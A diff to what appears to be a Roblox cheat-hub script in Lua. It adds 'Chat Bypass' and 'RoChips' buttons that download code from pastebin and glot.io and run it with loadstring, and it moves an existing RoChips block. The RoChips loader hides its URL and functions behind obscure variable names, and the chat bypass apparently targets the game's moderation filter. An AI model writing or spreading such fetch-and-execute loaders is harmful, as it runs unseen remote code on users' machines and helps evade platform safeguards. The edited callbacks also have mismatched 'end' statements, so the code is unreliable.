@@ -1248,6 +1248,27 @@ local Button = Tab:CreateButton({
    end,
 })
 
+local Button = Tab:CreateButton({
+   Name = "Chat Bypass",
+   Interact = 'Click',
+   Callback = function()
+   -- The function that takes place when the button is pressed
+   loadstring(game:HttpGet("https://pastebin.com/raw/aqmCAz7b"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "RoChips",
+   Interact = 'Click',
+   Callback = function()
+   -- The function that takes place when the button is pressed
+    if "you wanna use rochips universal" then
+	    local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+	    local im,lonely,z_c=task.wait,game,loadstring
+	    z_c(lonely:HttpGet(z_z..""..z_x))()
+	    return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+    end,
+})
 local Tab = Window:CreateTab("Scripts", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("Recommended",false) -- The 2nd argument is to tell if its only a Title and doesnt contain element
 
@@ -1269,6 +1290,8 @@ local Button = Tab:CreateButton({
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua'),true))()
    end,
 })
+
+
 
 local Button = Tab:CreateButton({
    Name = "Dead Rails - Lunor",
@@ -1361,17 +1384,6 @@ local Button = Tab:CreateButton({
    end,
 })
 
-local Button = Tab:CreateButton({
-   Name = "RoChips",
-   Interact = 'Click',
-   Callback = function()
-   -- The function that takes place when the button is pressed
-    if "you wanna use rochips universal" then
-	    local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
-	    local im,lonely,z_c=task.wait,game,loadstring
-	    z_c(lonely:HttpGet(z_z..""..z_x))()
-	    return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
-    end
 
    end,
 })
